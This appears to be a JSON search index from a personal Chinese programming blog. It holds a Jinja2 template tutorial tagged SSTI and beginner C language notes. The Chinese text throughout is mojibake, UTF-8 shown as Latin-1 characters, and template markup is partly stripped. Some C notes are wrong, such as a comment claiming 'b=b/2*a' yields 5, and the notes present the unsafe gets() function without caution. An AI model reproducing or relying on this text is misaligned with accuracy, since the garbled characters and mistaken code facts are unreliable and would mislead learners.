æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼ˆå¸ƒå°”å€¼ï¼‰ # loop.last # æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼ˆå¸ƒå°”å€¼ï¼‰ # loop.length # åºåˆ—é•¿åº¦ # loop.previtem # ä¸Šä¸€ä¸ªè¿­ä»£é¡¹ # loop.nextitem # ä¸‹ä¸€ä¸ªè¿­ä»£é¡¹ # loop.depth # å½“å‰å¾ªç¯çš„åµŒå¥—æ·±åº¦ï¼ˆä»1å¼€å§‹ï¼‰ # loop.depth0 # å½“å‰å¾ªç¯çš„åµŒå¥—æ·±åº¦ï¼ˆä»0å¼€å§‹ï¼‰ #% endfor % è¿ç®—ç¬¦ +å·è¿ç®—ç¬¦ï¼šæ•°å­—ç›¸åŠ ï¼Œå­—ç¬¦ä¸²ç›¸åŠ ï¼Œåˆ—è¡¨ç›¸åŠ ã€‚ä½†æ˜¯å¹¶ä¸æ¨èä½¿ç”¨+è¿ç®—ç¬¦æ¥æ“ä½œå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ç›¸åŠ åº”è¯¥ä½¿ç”¨~è¿ç®—ç¬¦ã€‚ -å·è¿ç®—ç¬¦ï¼šåªèƒ½å¯¹ä¸¤ä¸ªæ•°å­—ç›¸å‡ã€‚ /å·è¿ç®—ç¬¦ï¼šå¯¹ä¸¤ä¸ªæ•°è¿›è¡Œç›¸é™¤ã€‚ %å·è¿ç®—ç¬¦ï¼šå–ä½™è¿ç®—ã€‚ *å·è¿ç®—ç¬¦ï¼šä¹˜å·è¿ç®—ç¬¦ï¼Œå¹¶ä¸”å¯ä»¥å¯¹å­—ç¬¦è¿›è¡Œç›¸ä¹˜ã€‚ **å·è¿ç®—ç¬¦ï¼šæ¬¡å¹‚è¿ç®—ç¬¦ï¼Œæ¯”å¦‚2**3=8ã€‚ inæ“ä½œç¬¦ï¼šè·Ÿpythonä¸­çš„inä¸€æ ·ä½¿ç”¨ï¼Œæ¯”å¦‚1 in [1,2,3]è¿”å›trueã€‚ ~å·è¿ç®—ç¬¦ï¼šæ‹¼æ¥å¤šä¸ªå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚\"Hello\" ~ \"World\"å°†è¿”å›HelloWorld å®(éå¸¸é‡è¦) å®æ˜¯ Jinja2 ä¸­çš„ä¸€ç§å¯é‡ç”¨ä»£ç å—ï¼Œç±»ä¼¼äºå…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­çš„å‡½æ•° å®ç›¸å½“äºä¸€ä¸ªæ­å»ºå¥½çš„é¡µé¢ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥è¢«å¼•å…¥ï¼Œå¯ä»¥å¾€å®ä¼ é€’å‚æ•°ã€‚å¯ä»¥å°†ä¸€äº›ç»å¸¸ç”¨åˆ°çš„ä»£ç ç‰‡æ®µæ”¾åˆ°å®ä¸­ï¼Œç„¶åæŠŠä¸€äº›ä¸å›ºå®šçš„å€¼æŠ½å–å‡ºæ¥å½“æˆä¸€ä¸ªå˜é‡ï¼Œåœ¨ä½¿ç”¨å®æ—¶ä¼ é€’å‚æ•°ï¼Œä»è€Œå°†å®æ¸²æŸ“æˆä¸ºé¡µé¢çš„ä¸€éƒ¨åˆ† å®šä¹‰å’Œè°ƒç”¨å® # å®šä¹‰å® #% macro å®åç§°(å‚æ•°1, å‚æ•°2=é»˜è®¤å€¼) % # å®å†…å®¹ # å‚æ•°1 - å‚æ•°2 % endmacro %# è°ƒç”¨å® # å®åç§°(å€¼1, å‚æ•°2=å€¼2) å¦‚å®šä¹‰å’Œè°ƒç”¨ä¸€ä¸ªinputæ ‡ç­¾å® % macro inpput(name,value=,type=text,class=) % input type= type name= name value= value class=form-control class % endmacro %form input(username) input(password,type=password) input(email,type=email,class=large)/form é¡µé¢æ–‡ä»¶ä¸­å¯¼å…¥å®(import) åœ¨å¼€å‘ä¸­ï¼Œä¼šå°†ä¸€äº›å¸¸ç”¨çš„å®å•ç‹¬æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéœ€è¦æ—¶å†ä»è¿™ä¸ªæ–‡ä»¶ä¸­å¯¼å…¥ pyä¸­importè§£æ 1.ç›´æ¥å¯¼å…¥æ•´ä¸ªæ¨¡å— import math 2.å¯¼å…¥æ¨¡æ¿å¹¶è®¾ç½®åˆ«å import numpy as np 3.å¯¼å…¥ç‰¹å®šå‡½æ•°/ç±» from math import sqrt,pi 4.å¯¼å…¥å¹¶è®¾ç½®åˆ«å from datetime import datetime as dt % import forms.html as forms % //å¯¼å…¥å®æ–‡ä»¶dldtUsername/dtdd forms.input(username) /dd //ä½¿ç”¨å®dtPassword/dtdd forms.input(password, type=password) /dd/dlp forms.textarea(comment) /p å¯¼å…¥æ¨¡æ¿å¹¶ä¸ä¼šæŠŠå½“å‰ä¸Šä¸‹æ–‡ä¸­çš„å˜é‡æ·»åŠ åˆ°è¢«å¯¼å…¥çš„æ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¯¼å…¥çš„æ—¶å€™ä½¿ç”¨with context æŠŠä¸Šä¸‹æ–‡ä¼ è¿›å»ï¼š % from forms.html import my_macro with context % å®æ–‡ä»¶ä¸­å¼•ç”¨å…¶ä»–å®(include) includeè¯­å¥å¯ä»¥æŠŠä¸€ä¸ªæ¨¡æ¿å¼•å…¥åˆ°å¦å¤–ä¸€ä¸ªæ¨¡æ¿ä¸­ï¼Œç±»ä¼¼äºæŠŠä¸€ä¸ªæ¨¡æ¿çš„ä»£ç copyåˆ°å¦å¤–ä¸€ä¸ªæ¨¡æ¿çš„æŒ‡å®šä½ç½® # greeting.html #phelloï¼Œ username ï¼/p# profile.html #% set username = ikun %div class=profile % include greeting.html % # å¯ä»¥è®¿é—®å½“å‰ä¸Šä¸‹æ–‡çš„å˜é‡ #/div æ¨¡æ¿æ–‡ä»¶çš„ç»§æ‰¿ æ¨¡æ¿å…è®¸æ„å»ºä¸€ä¸ªåŸºç¡€éª¨æ¶æ¨¡æ¿ï¼Œç„¶åè®©å­æ¨¡æ¿ç»§æ‰¿å¹¶è¦†ç›–ç‰¹å®šéƒ¨åˆ† åŸºç¡€æ¨¡æ¿(base.html)ï¼š !DOCTYPE htmlhtmlhead % block head % title% block title %é»˜è®¤æ ‡é¢˜% endblock %/title % endblock %/headbody % block content % !-- é»˜è®¤å†…å®¹ -- pè¿™æ˜¯åŸºç¡€æ¨¡æ¿çš„å†…å®¹/p % endblock %/body/html å­æ¨¡æ¿(child.html): % extends base.html %% block title %å­é¡µé¢æ ‡é¢˜% endblock %% block content % super() # ä¿ç•™çˆ¶æ¨¡æ¿å†…å®¹ # pè¿™æ˜¯å­æ¨¡æ¿æ·»åŠ çš„å†…å®¹/p% endblock % % extends % æŒ‡ä»¤ å¿…é¡»æ˜¯æ¨¡æ¿çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾ æŒ‡å®šè¦ç»§æ‰¿çš„çˆ¶æ¨¡æ¿è·¯å¾„ å­æ¨¡æ¿ä¸­æœªå®šä¹‰çš„å—å°†ä½¿ç”¨çˆ¶æ¨¡æ¿çš„é»˜è®¤å†…å®¹ % block %` æ ‡ç­¾ - å®šä¹‰å¯è¢«è¦†ç›–çš„å†…å®¹åŒºå— - åŸºæœ¬è¯­æ³•ï¼š`% block block_name %å†…å®¹% endblock % æ”¯æŒåµŒå¥— block super() å‡½æ•° åœ¨å­æ¨¡æ¿ä¸­è°ƒç”¨çˆ¶æ¨¡æ¿çš„ block å†…å®¹ å¯ä»¥æ§åˆ¶çˆ¶æ¨¡æ¿å†…å®¹çš„æ’å…¥ä½ç½® æ¨¡æ¿æ–‡ä»¶ä¸­å¯¹blockå†…å®¹çš„è°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨ self.blockName çš„æ–¹å¼ title% block title %% endblock %/titleh1 self.title() /h1 # è°ƒç”¨title blockçš„å†…å®¹ # è¿‡æ»¤å™¨ è¿‡æ»¤å™¨æ˜¯é€šè¿‡ï¼ˆ|ï¼‰ç¬¦å·è¿›è¡Œä½¿ç”¨çš„ï¼Œå…¶ç›¸å½“äºæ˜¯ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå½“å‰çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­ï¼Œç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªå·±çš„åŠŸèƒ½ï¼Œå†è¿”å›ç›¸åº”çš„å€¼ï¼Œä¹‹åå†å°†ç»“æœæ¸²æŸ“åˆ°é¡µé¢ä¸­ åˆ†ç±» è¿‡æ»¤å™¨ åŠŸèƒ½æè¿° ä½¿ç”¨ç¤ºä¾‹ è¾“å‡ºç»“æœ å­—ç¬¦ä¸²å¤„ç† lower è½¬æ¢ä¸ºå°å†™ \"HELLO\" | lower hello upper è½¬æ¢ä¸ºå¤§å†™ \"hello\" | upper HELLO capitalize é¦–å­—æ¯å¤§å†™ \"hello\" | capitalize Hello trim å»é™¤é¦–å°¾ç©ºæ ¼ \" hello \" | trim hello replace(old, new) å­—ç¬¦ä¸²æ›¿æ¢ \"Hi Tom\" | replace(\"Tom\", \"Alice\") Hi Alice truncate(length=255) æˆªæ–­å­—ç¬¦ä¸² \"Long text\" | truncate(4) Long... åˆ—è¡¨/å­—å…¸ first è·å–ç¬¬ä¸€ä¸ªå…ƒç´  [1,2,3] | first 1 last è·å–æœ€åä¸€ä¸ªå…ƒç´  [1,2,3] | last 3 length è·å–å…ƒç´ æ•°é‡ \"hello\" | length 5 join(delimiter) è¿æ¥åˆ—è¡¨å…ƒç´  [\"A\",\"B\"] | join(\"--\") A--B sort æ’åºåˆ—è¡¨ [3,1,2] | sort [1,2,3] map(attribute) æå–å¯¹è±¡å±æ€§ users | map(attribute='name') ç”¨æˆ·ååˆ—è¡¨ æ•°å€¼å¤„ç† round(precision) å››èˆäº”å…¥ 3.14159 | round(2) 3.14 abs ç»å¯¹å€¼ -5 | abs 5 int / float ç±»å‹è½¬æ¢ \"3.14\" | float 3.14 æ—¥æœŸæ—¶é—´ datetimeformat(format) æ ¼å¼åŒ–æ—¥æœŸ now | datetimeformat(\"%Y/%m/%d\") 2023/08/15 date æå–æ—¥æœŸéƒ¨åˆ† now | date 2023-08-15 é€»è¾‘å¤„ç† default(value) è®¾ç½®é»˜è®¤å€¼ name | default(\"åŒ¿å\") å˜é‡ä¸ºç©ºæ—¶è¾“å‡ºåŒ¿å selectattr(condition) æ¡ä»¶ç­›é€‰åˆ—è¡¨ users | selectattr(\"is_active\") æ´»è·ƒç”¨æˆ·åˆ—è¡¨ rejectattr(condition) åå‘ç­›é€‰åˆ—è¡¨ users | rejectattr(\"is_banned\") éå°ç¦ç”¨æˆ·åˆ—è¡¨ HTMLå®‰å…¨ escape / e HTMLè½¬ä¹‰ï¼ˆé˜²XSSï¼‰ \"\" | escape script safe æ ‡è®°å†…å®¹ä¸ºå®‰å…¨ï¼ˆä¸è½¬ä¹‰ï¼‰ \"Hi\" | safe æ˜¾ç¤ºç²—ä½“Hi striptags å»é™¤HTMLæ ‡ç­¾ \"text\" | striptags text æµ‹è¯•å™¨ æµ‹è¯•å™¨ä¸»è¦ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦æ»¡è¶³æŸç§ç±»å‹ï¼Œè¯­æ³•æ˜¯ï¼šif...is...ï¼š % if variable is escaped%value of variable: escaped % else %variable is not escaped% endif % Jinja2ä¸­æµ‹è¯•å™¨æœ‰ï¼š callable(object)ï¼šæ˜¯å¦å¯è°ƒç”¨ã€‚ defined(object)ï¼šæ˜¯å¦å·²ç»è¢«å®šä¹‰äº†ã€‚ escaped(object)ï¼šæ˜¯å¦å·²ç»è¢«è½¬ä¹‰äº†ã€‚ upper(object)ï¼šæ˜¯å¦å…¨æ˜¯å¤§å†™ã€‚ lower(object)ï¼šæ˜¯å¦å…¨æ˜¯å°å†™ã€‚ string(object)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ sequence(object)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªåºåˆ—ã€‚ number(object)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªæ•°å­—ã€‚ odd(object)ï¼šæ˜¯å¦æ˜¯å¥‡æ•°ã€‚ even(object)ï¼šæ˜¯å¦æ˜¯å¶æ•°ã€‚ è½¬ä¹‰ åœ¨æ¨¡æ¿æ¸²æŸ“å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²æœ‰å¯èƒ½åŒ…æ‹¬ä¸€äº›éå¸¸å±é™©çš„å­—ç¬¦æ¯”å¦‚ã€ç­‰ï¼Œè¿™äº›å­—ç¬¦ä¼šç ´åæ‰åŸæ¥HTMLæ ‡ç­¾çš„ç»“æ„ï¼Œæ›´ä¸¥é‡çš„å¯èƒ½ä¼šå‘ç”ŸXSSè·¨åŸŸè„šæœ¬æ”»å‡»ï¼Œå› æ­¤å¦‚æœç¢°åˆ°ã€è¿™äº›å­—ç¬¦çš„æ—¶å€™ï¼Œåº”è¯¥è½¬ä¹‰æˆHTMLèƒ½æ­£ç¡®è¡¨ç¤ºè¿™äº›å­—ç¬¦çš„å†™æ³• å¯¹äºä¸€äº›ä¸ä¿¡ä»»çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡ content_html|e æˆ–è€…æ˜¯ content_html|escape çš„æ–¹å¼è¿›è¡Œè½¬ä¹‰ã€‚ å¦‚æœæƒ³å…³é—­è‡ªåŠ¨è½¬ä¹‰ï¼Œå¯ä»¥é€šè¿‡ content_html|safe çš„æ–¹å¼å…³é—­è‡ªåŠ¨è½¬ä¹‰ã€‚ %autoescape true/false%...%endautoescape%å¯ä»¥å°†ä¸€æ®µä»£ç å—æ”¾åœ¨ä¸­é—´ï¼Œæ¥å¼€å¯æˆ–å…³é—­è‡ªåŠ¨è½¬ä¹‰ï¼š % autoescape false %pautoescaping is disabled herep will_not_be_escaped % endautoescape % æ¨¡æ¿é¡µé¢ä¸­å¼•å…¥é™æ€æ–‡ä»¶ é™æ€æ–‡ä»¶ä¸»è¦åŒ…æ‹¬æœ‰CSSæ ·å¼æ–‡ä»¶ã€JavaScriptè„šæœ¬æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ã€å­—ä½“æ–‡ä»¶ç­‰é™æ€èµ„æºã€‚ åœ¨Jinjaä¸­åŠ è½½é™æ€æ–‡ä»¶åªéœ€è¦é€šè¿‡url_forå…¨å±€å‡½æ•°å°±å¯ä»¥å®ç°ï¼š link href= url_for(static,filename=about.css) å‚è€ƒï¼š Jinja2ç”¨æ³•æ€»ç»“","tags":["æ¼æ´","SSTI"],"categories":["æ¼æ´"]},{"title":"Cè¯­è¨€","path":"/2025/07/09/Cè¯­è¨€/","content":"Cè¯­è¨€æ˜“é”™éš¾æ‡‚çŸ¥è¯† ä¸€äº›åŸºç¡€çŸ¥è¯† 1.è¿›åˆ¶ äºŒè¿›åˆ¶ï¼š0bå¼€å¤´ å…«è¿›åˆ¶ï¼š0å¼€å¤´ åå…­è¿›åˆ¶ï¼š0Xå¼€å¤´ï¼ˆ09ï¼ŒAFï¼‰ 2.float 4å­—èŠ‚ æœ‰æ•ˆæ•°å­—6 double 8å­—èŠ‚ æœ‰æ•ˆæ•°å­—15 ä¸åŒç±»å‹æ•°æ®è¿ç®—æ—¶ï¼Œé™¤å¼ºåˆ¶ç±»å‹è½¬æ¢å¤–ï¼Œç»“æœéƒ½ä¸ºdoubleå‹ åœ¨ä¸€ä¸ªæ•´æ•°æœ«å°¾åŠ L/lè¡¨ç¤ºé•¿æ•´å‹ eg. int b=5; â€‹ float a=2.0; â€‹ b=b/2*a; //b=5 3.ç´ æ•°ä¸­ï¼šä¸å¿…è¢«2ï¼ˆn-1ï¼‰æ•´é™¤ï¼Œåªéœ€è¢«2âœ“nå³å¯ï¼Œj*ji 4.a%bç»“æœç”±açš„æ­£è´Ÿæ€§å†³å®šï¼Œåªè¦aä¸ºè´Ÿæ•°ï¼Œç»“æœä¸ºè´Ÿæ•° 5.å¸¸é‡å’Œå¸¸å˜é‡ å¸¸å˜é‡ï¼šåœ¨å®šä¹‰å˜é‡æ—¶ï¼ŒåŠ ä¸€ä¸ªconst â€‹ eg.const int a=3; å˜é‡ï¼š ï¼ˆ1ï¼‰æ•´å‹å˜é‡ 1000 ï¼ˆ2ï¼‰å®å‹å˜é‡ 12.34e3 ï¼ˆ3ï¼‰å­—ç¬¦å¸¸é‡ï¼ˆåªèƒ½ä¸ºä¸€ä¸ªå­—ç¬¦,â€™ \\42 'ä¸ºä¸€ä¸ªå­—ç¬¦ï¼‰ â€‹ 1ï¼‰æ™®é€šå­—ç¬¦ï¼šä»¥ASCIIç å­˜å‚¨ â€‹ å¸¸è§çš„ASCIIï¼šâ€˜Aâ€™ =65 â€˜aâ€™ =97 0 =48 â€‹ 2ï¼‰è½¬ä¹‰å­—ç¬¦ï¼šä»¥â€™ \\ â€˜å¼€å¤´ï¼Œå°†â€™ \\ 'åçš„å­—ç¬¦è½¬åŒ–ä¸ºå¦å¤–æ„æ€ â€‹ eg.â€™ \\x41 â€˜è¡¨ç¤º16è¿›åˆ¶41çš„ASCIIå­—ç¬¦ï¼Œå³â€™ A â€™ â€‹ 3ï¼‰å­—ç¬¦ä¸²å¸¸é‡ï¼šâ€œboyâ€ â€‹ 4ï¼‰ç¬¦å·å¸¸é‡ï¼ˆä¸èƒ½å¯¹å…¶èµ‹æ–°å€¼ï¼‰ï¼š#define PI 3.1416 6.æ ‡è¯†ç¬¦ï¼šåªç”±å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ç»„æˆï¼›ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å­—æ¯æˆ–ä¸‹åˆ’çº¿ 7.unsigned int =æ— ç¬¦å·æ•´å‹ è¾“å‡ºç”¨%u ï¼ˆå……åˆ†åˆ©ç”¨å˜é‡çš„å€¼çš„èŒƒå›´ï¼ˆæ•°æ®èŒƒå›´åªæœ‰æ­£å€¼ï¼‰ï¼‰ 8.é€—å·è¡¨è¾¾å¼ç»“æœå–åé¢çš„å€¼ eg.i=(a=6,a*5),a+6;//i=30 9.è¦è¾“å‡º%åº”è¯¥è¿ç»­ä½¿ç”¨2ä¸ª% 10.å­—ç¬¦å˜é‡ char c= ? ;printf(%d %c,c,c);=63 ? 11.iå’Œi i=3; j=i++(i=4,j=3)//å…ˆèµ‹å€¼åè‡ªåŠ  j=++i(i=4,j=4)//å…ˆè‡ªåŠ åœ¨èµ‹å€¼ 12.è¾“å‡ºï¼š ç”¨%få¾—åˆ°6ä½å°æ•° %-m.nf ï¼š â€‹ -å·ä¸ºå·¦å¯¹é½ â€‹ mä¸ºæœ€å°å®½åº¦ï¼šè¾“å‡ºçš„æ€»å®½åº¦ï¼ˆåŒ…æ‹¬å°æ•°ç‚¹ã€å°æ•°éƒ¨åˆ†å’Œæ•´æ•°éƒ¨åˆ†ï¼‰å¦‚æœå®é™…æ•°æ®é•¿åº¦å°äº mï¼Œå°†ç”¨ç©ºæ ¼å¡«å……ï¼›å¦‚æœæ•°æ®é•¿åº¦è¶…è¿‡ mï¼Œåˆ™æŒ‰å®é™…é•¿åº¦è¾“å‡ºï¼Œä¸æˆªæ–­ â€‹ nä¸ºå°æ•°å°æ•°ä½æ•°ï¼šå¦‚æœå®é™…å°æ•°ä½æ•°è¶…è¿‡ nï¼Œä¼šè¿›è¡Œå››èˆäº”å…¥ï¼›å¦‚æœä¸è¶³nï¼Œä¼šç”¨0è¡¥è¶³ %eæŒ‡å®šä»¥æŒ‡æ•°å½¢å¼è¾“å‡ºå®æ•°ï¼Œè‡ªåŠ¨ç»™å‡ºæ•°å­—éƒ¨åˆ†å°æ•°ä½æ•°ä¸º6ä½ï¼ŒæŒ‡æ•°éƒ¨åˆ†å 5åˆ— eg.1.234560 e+002 13.è¿ç®—ç¬¦ä¼˜å…ˆçº§ 14.å­—ç¬¦ï¼ˆä¸€ä¸ªï¼‰è¾“å…¥è¾“å‡ºï¼š getchar putcharÂ© 15.åœ¨åˆ¤æ–­ä¸€ä¸ªé‡æ˜¯å¦ä¸ºçœŸæ—¶ï¼Œ0ä¸ºå‡ï¼Œé0ä¸ºçœŸ ab//aå’Œbéƒ½é0ï¼ˆåªæœ‰aä¸ºçœŸæ—¶ï¼Œæ‰éœ€è¦åˆ¤åˆ«bçš„å€¼ï¼‰ a||b//aå’Œbè‡³å°‘ä¸€ä¸ªé0ï¼ˆåªæœ‰aä¸ºå‡æ—¶æ‰éœ€è¦åˆ¤åˆ«bçš„å€¼ï¼‰ 16.åˆ¤æ–­éé—°å¹´ï¼š !((year%4==0year%100!=0)||year%400==0) 17.ä¸¤ä¸ªæ•°ä¹˜ç§¯=ä¸¤ä¸ªæ•°æœ€å¤§å…¬çº¦æ•° x æœ€å°å…¬å€æ•° é€‰æ‹©ç»“æ„ ï¼Ÿï¼šè¡¨è¾¾å¼ï¼ˆä»£æ›¿å¤æ‚çš„ifï¼‰ max=(ab)?a:b;//abä¸ºçœŸçš„è¯ï¼Œmax=aï¼Œå¦åˆ™ä¸ºb switch switch(è¡¨è¾¾å¼){ â€‹\tcase å¸¸é‡1:è¯­å¥1; â€‹\tâ€¦ â€‹\tdefault:â€¦; } å¾ªç¯ç»“æ„ whileè¯­å¥ åªè¦å¾ªç¯æ¡ä»¶è¡¨è¾¾å¼ä¸ºçœŸæ—¶ï¼Œå°±æ‰§è¡Œ eg.while(iâ€“)//æ¯æ¬¡å¾ªç¯å¼€å§‹å…ˆæ£€æŸ¥iå½“å‰å€¼æ˜¯å¦ä¸ºçœŸï¼Œè‹¥ä¸ºçœŸï¼Œå¾ªç¯ç»§ç»­ï¼Œæ¯æ¬¡å¾ªç¯ç»“æŸæ—¶iå€¼å‡å°‘ä¸€ do whileè¯­å¥ å…ˆæ— æ¡ä»¶æ‰§è¡Œï¼Œå†åˆ¤æ–­å¾ªç¯æ¡ä»¶æ˜¯å¦æˆç«‹ forè¯­å¥ for(â€¦;â€¦[åªè¦å€¼ä¸ºçœŸï¼Œå°±æ‰§è¡Œå¾ªç¯];â€¦) breakå’Œcontinue breakï¼šæå‰ç»ˆæ­¢å¾ªç¯ continueï¼šæå‰ç»“æŸæœ¬æ¬¡å¾ªç¯ï¼Œæ¥ç€æ‰§è¡Œä¸‹æ¬¡å¾ªç¯ æ•°ç»„ a[3][4] =3è¡Œ4åˆ— å­—ç¬¦æ•°ç»„ å­—ç¬¦ä¸²ç»“æŸæ ‡å¿— ä¸€ä¸ªå­—ç¬¦ä¸²ä»¥å­—ç¬¦'\\0'ä½œä¸ºç»“æŸæ ‡å¿—ï¼ˆcè¯­è¨€åœ¨å­—ç¬¦æ•°ç»„å‚¨å­˜å­—ç¬¦ä¸²å¸¸é‡å¸‚ä¼šè‡ªåŠ¨åŠ ä¸€ä¸ªâ€™\\0â€™ä½œç»“æŸç¬¦ï¼‰ å­—ç¬¦æ•°ç»„çš„è¾“å…¥è¾“å‡º %s =æ•´ä¸ªå­—ç¬¦ä¸² %c =ä¸€ä¸ªå­—ç¬¦ è¾“å‡ºæ—¶é‡åˆ°â€™\\0â€™å°±åœæ­¢è¾“å‡º scanfè¾“å…¥é¡¹å¦‚æœæ˜¯å­—ç¬¦æ•°ç»„åï¼Œä¸åŠ  scanfè¯»å–å­—ç¬¦ä¸²æ—¶ï¼Œä¼šåœ¨é‡ç©ºç™½å­—ç¬¦æ—¶åœæ­¢è¯»å– å•è¡Œå­—ç¬¦ä¸² while((ch=getchar())!= ) a[i]=ch; i++; char string[100];char c;gets(string);for(int i=0;(c=string[i])!=\\0;i++)Â·Â·Â·\\\\éå†å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦ nè¡Œå­—ç¬¦ä¸² scanf(%d,n);getchar();char a[100];for(int i=0;in;i++) gets(a); Â·Â·Â· scanf(%d,n);getchar();char string[n][100];for(int i=0;in;i++) gets(string[i]); for(int j=0;string[i][j]!=\\0;j++)Â·Â·Â· å­—ç¬¦ä¸²å¤„ç†å‡½æ•° è®°å¾—åŠ #includestring.h puts è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«è½¬ä¹‰å­—ç¬¦ e.g char str[]=abc def;puts(str); =abc def gets ä»ç»ˆç«¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°å­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”å¾—åˆ°ä¸€ä¸ªå‡½æ•°å€¼ï¼Œè¯¥å‡½æ•°å€¼æ˜¯å­—ç¬¦æ•°ç»„çš„èµ·å§‹åœ°å€ æ³¨ï¼šgetså’Œputså‡½æ•°åªèƒ½è¾“å…¥/è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸² strcat æŠŠä¸¤ä¸ªå­—ç¬¦æ•°ç»„ä¸­å­—ç¬¦ä¸²è¿æ¥èµ·æ¥ strcat(str1,str2); strcpyå’Œstrncpy å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•° strcpy å°†å­—ç¬¦ä¸²2å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„1ä¸­ æ³¨ï¼šèµ‹å€¼è¯­å¥åªèƒ½å°†ä¸€ä¸ªå­—ç¬¦èµ‹ç»™ä¸€ä¸ªå­—ç¬¦å‹å˜é‡/å­—ç¬¦æ•°ç»„å…ƒç´  strncpy å°†å­—ç¬¦ä¸²2ä¸­å‰nä¸ªå­—ç¬¦å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„1ä¸­ strncpy(str1,str2,2);//å°†str2å‰2ä¸ªå–ä»£str1åŸæœ‰çš„2ä¸ª strcmp å­—ç¬¦ä¸²æ¯”è¾ƒï¼š2ä¸ªå­—ç¬¦ä¸²ä»å·¦åˆ°å³é€ä¸ªæ¯”è¾ƒï¼ˆASCIIå€¼ï¼‰ï¼Œç›´åˆ°å‡ºç°ä¸åŒå­—ç¬¦æˆ–é‡åˆ°â€™\\0â€™ä¸ºæ­¢ å­—ç¬¦ä¸²1=å­—ç¬¦ä¸²2 å‡½æ•°å€¼ä¸º0 å­—ç¬¦ä¸²1å­—ç¬¦ä¸²2 å‡½æ•°å€¼ä¸ºæ­£æ•´æ•° å­—ç¬¦ä¸²1å­—ç¬¦ä¸²2 å‡½æ•°å€¼ä¸ºè´Ÿæ•´æ•° strlen æµ‹å­—ç¬¦ä¸²é•¿åº¦ strlwr è½¬æ¢ä¸ºå°å†™ strupr è½¬æ¢ä¸ºå¤§å†™ ctype.hå¤´æ–‡ä»¶ isalphaåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯å­—æ¯ isdigitåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯æ•°å­— isloweråˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯å°å†™å­—æ¯ isupperåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯å¤§å†™å­—æ¯ isspaceåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯ç©ºç™½å­—ç¬¦ tolowerå°†å­—ç¬¦å¤§å†™å˜å°å†™ toupperå°†å­—ç¬¦å°å†™å˜å¤§å†™ å‡½æ•° å‡½æ•°çš„å®šä¹‰ä¸å£°æ˜ åœ¨å®šä¹‰å‡½æ•°æ—¶è¦æŒ‡å®šå‡½æ•°çš„ç±»å‹ å‡½æ•°ç±»å‹å†³å®šè¿”å›å€¼ç±»å‹ ç”¨å‡½æ•°åŸå‹ï¼ˆå‡½æ•°é¦–éƒ¨ï¼‰ä½œå‡½æ•°å£°æ˜ e.g int add(int a,int b); å‡½æ•°çš„åµŒå¥— int max4(int a,int b,int c,int d) int max2(int a,int b); return max2(max2(max2(a,b),c),d);int max2(int a,int b) return(a=b?a:b); å±€éƒ¨ä¸å…¨å±€å˜é‡ æ³¨ï¼šå…¨å±€å˜é‡å¼€å¤´ä¸€èˆ¬ç”¨å¤§å†™å­—æ¯ï¼Œæ¥åŒºåˆ«å±€éƒ¨å˜é‡ static é™æ€å±€éƒ¨/å…¨å±€å˜é‡ å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„å€¼åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåä¸æ¶ˆå¤±è€Œç»§ç»­ä¿ç•™æœ¬æ¬¡è°ƒç”¨ç»“æŸåçš„å€¼ e.g static int f=1; extern å¤–éƒ¨å˜é‡å£°æ˜ åœ¨ä¸€ä¸ªæ–‡ä»¶å†…æ‰©å±•å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸ å°†å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸæ‰©å±•åˆ°å…¶ä»–æ–‡ä»¶ e.g extern A,B,C; \\ \\å¯çœç•¥intç­‰ç±»å‹ æŒ‡é’ˆ æŒ‡é’ˆå˜é‡ æŒ‡é’ˆæ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€ŒæŒ‡é’ˆå˜é‡æ˜¯å­˜æ”¾åœ°å€çš„å˜é‡ æŒ‡é’ˆå˜é‡ä¸­åªèƒ½å­˜æ”¾åœ°å€ï¼ˆæŒ‡é’ˆï¼‰ï¼Œä¸è¦å°†ä¸€ä¸ªæ•´æ•°ç»™æŒ‡é’ˆå˜é‡ p=a; *p=1;\\ \\å°†1èµ‹å€¼ç»™pæ‰€æŒ‡å‘çš„å˜é‡å³æŠŠ1èµ‹ç»™a 